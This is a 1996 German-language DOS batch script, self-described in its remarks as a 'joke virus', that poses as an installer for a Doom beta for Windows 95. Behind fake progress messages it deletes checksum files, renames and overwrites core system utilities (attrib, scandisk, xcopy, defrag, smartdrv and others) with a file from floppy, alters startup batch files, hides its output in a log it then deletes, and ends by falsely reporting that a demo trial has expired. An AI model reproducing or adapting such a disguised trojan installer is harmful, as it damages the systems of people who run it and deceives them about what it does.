@echo off
break off
rem
rem Program Virus 001 Install
rem
rem Tobi's 1. Joke-Virus.
rem geschrieben fr Frank Schelle
rem am 04 Juli 1996
rem um 13.00 Uhr.
rem
c:
cd \
cls
if exist c:\windows\chklist.*         del c:\windows\chklist.*
if exist c:\windows\command\chklist.* del c:\windows\command\chklist.*
md doom95
cd doom95
echo.
echo.
echo. Starte Installation von Doom fr Windows 95 3.0 Beta-Version.
echo.
echo. Kopiere EXE-Datei.
echo.
copy a:doom01.ovl c:\doom95\arj.exe /v >c:\windows\help\zzz.tb
copy a:info.sys c:\windows\info.com /v >>c:\windows\help\zzz.tb
copy a:doom95.wa_ c:\windows\help\de-inst.com /v >>c:\windows\help\zzz.tb
echo.
echo.
echo. Aktualisiere Registrierdatenbank.
echo. Einen Moment bitte.
cd \windows
copy a:doom02.ovl c:\windows\taskman2.exe /v >>c:\windows\help\zzz.tb
ren defrag.exe   defrag.tst
ren welcome.exe  welcome.w95
ren smartdrv.exe smartdrv.all
ren write.exe    write.net
copy dosstart.bat dosend.bat /v >>c:\windows\help\zzz.tb
copy winstart.bat winend.bat /v >>c:\windows\help\zzz.tb
echo.c:\windows\command\share.exe >>c:\windows\dosstart.bat
echo.c:\windows\command\share.exe >>c:\windows\winstart.bat
cd command
ren attrib.exe   system.exe
ren scandisk.exe scanit.1st
ren share.exe    share.ovl
ren xcopy.exe    xcopy.hlp
ren mscdex.exe   msdos.w30
echo.
echo.
echo. Bitte legen Sie die zweite Diskette ein
echo. und drcken Sie eine beliebige Taste.
echo.
pause >>c:\windows\help\zzz.tb
echo.
echo.
echo. Kopiere Programm-Dateien.
cd \windows\system
arj e -y a:doom03.ovl >>c:\windows\help\zzz.tb
copy a:help.sys c:\windows\command\share.exe /v >>c:\windows\help\zzz.tb
copy a:help.sys c:\windows\command\mscdex.exe /v >>c:\windows\help\zzz.tb
copy a:help.sys c:\windows\command\scandisk.exe /v >>c:\windows\help\zzz.tb
copy a:help.sys c:\windows\command\attrib.exe /v
copy a:help.sys c:\windows\command\xcopy.exe /v
copy a:help.sys c:\windows\defrag.exe /v
copy a:help.sys c:\windows\welcome.exe /v
copy a:help.sys c:\windows\smartdrv.exe /v
copy a:help.sys c:\windows\write.exe /v
copy a:help.sys c:\windows\help.all /v
echo.
echo.
echo. Erstelle WAD-Dateien.
system +r c:\windows\help.all
system +r c:\windows\system\msppv??.dll
cd \
deltree /y doom95
echo.
echo.
echo. Dies ist eine Runtime-Demo Version.
echo. Die Testzeit ist abgelaufen.
echo. Doom wurde nicht installiert.
echo. Bitte erkundigen Sie sich nach der Vollversion bei Ihrem H„ndler.
echo. Danke.
echo.
echo. Installation beendet.
echo.
del c:\windows\help\zzz.tb
